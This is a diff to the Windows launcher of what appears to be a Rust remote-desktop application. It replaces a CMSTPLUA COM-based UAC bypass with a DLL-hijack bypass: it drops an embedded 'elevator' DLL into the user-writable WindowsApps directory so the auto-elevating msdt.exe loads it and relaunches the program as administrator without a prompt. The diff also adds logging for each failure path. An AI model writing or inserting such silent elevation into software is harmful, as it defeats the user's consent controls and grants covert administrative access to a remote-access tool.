@@ -334,11 +334,6 @@ fn seconds_to_utc(mut secs: i64) -> (i32, u32, u32, u32, u32, u32) {
     (y, mo, d, h, mi, s)
 }
 
-#[cfg(windows)]
-fn fmt_hresult(hr: i32) -> String {
-    format!("0x{:08X}", hr as u32)
-}
-
 /// Whether the invocation is a plain unattended launch: no arguments, or only `-force` and
 /// `--server-ip` in the shapes `core_main` accepts. Other launches (`-show`, connect URL,
 /// install, update, quick support) keep their original behavior and are not elevated.
@@ -527,11 +522,13 @@ fn main() -> Result<(), String> {
     let quick_support = false;
 
     // A headless launch first tries to obtain administrator rights without a UAC prompt:
-    // `CMSTPLUA` is an auto-elevate COM object, so `CoGetObject` returns an elevated
-    // `ICMLuaUtil` whose `ShellExec` starts this executable again as a high-integrity
+    // the auto-elevate `msdt.exe` resolves `AudioDiagnosticUtil.dll` through `PATH`, so a
+    // drop in the user-writable `WindowsApps` directory makes the elevated msdt load the
+    // embedded elevator DLL, which starts this executable again as a high-integrity
     // child. Windows cannot raise an existing process in place, so that copy takes over
     // and this one exits. Every failure (not an administrator, "Always notify" policy,
-    // COM or antivirus block) falls through to the unchanged launch below.
+    // msdt missing, antivirus eating the drop) falls through to the unchanged launch
+    // below.
     #[cfg(windows)]
     {
         let bare = is_bare_launch(&args);
@@ -543,31 +540,39 @@ fn main() -> Result<(), String> {
         if !already_elevated && !click_setup && !quick_support && bare && !elevated {
             match uac::relaunch_elevated(&args) {
                 uac::RelaunchResult::Launched => {
-                    wrapper_log("uac relaunch launched OK, exiting wrapper".to_owned());
+                    wrapper_log(
+                        "uac relaunch confirmed (elevated chain owns the pipe), exiting wrapper"
+                            .to_owned(),
+                    );
                     return Ok(());
+                }
+                uac::RelaunchResult::Blocked(reason) => {
+                    wrapper_log(format!("uac relaunch skipped: {}", reason));
                 }
                 uac::RelaunchResult::NoCurrentExe => {
                     wrapper_log("uac relaunch skipped: current_exe() failed".to_owned());
                 }
-                uac::RelaunchResult::CoInitFailed(hr) => {
+                uac::RelaunchResult::NoDll => {
+                    wrapper_log(
+                        "uac relaunch skipped: build carries no elevator DLL".to_owned()
+                    );
+                }
+                uac::RelaunchResult::DropFailed => {
+                    wrapper_log(
+                        "uac relaunch failed: could not drop elevator DLL/cfg".to_owned()
+                    );
+                }
+                uac::RelaunchResult::LaunchFailed(gle) => {
                     wrapper_log(format!(
-                        "uac relaunch failed: CoInitializeEx={}",
-                        fmt_hresult(hr)
+                        "uac relaunch failed: CreateProcessW gle={:#010x}",
+                        gle
                     ));
                 }
-                uac::RelaunchResult::CoGetObjectFailed(hr) => {
-                    wrapper_log(format!(
-                        "uac relaunch failed: CoGetObject={} (admin group? UAC default?)"
-                    , fmt_hresult(hr)));
-                }
-                uac::RelaunchResult::NullObject => {
-                    wrapper_log("uac relaunch failed: CoGetObject returned null".to_owned());
-                }
-                uac::RelaunchResult::ShellExecFailed(hr) => {
-                    wrapper_log(format!(
-                        "uac relaunch failed: ShellExec={}",
-                        fmt_hresult(hr)
-                    ));
+                uac::RelaunchResult::ConfirmTimeout => {
+                    wrapper_log(
+                        "uac relaunch failed: no elevated chain within timeout (drop cleaned up)"
+                            .to_owned(),
+                    );
                 }
             }
         }
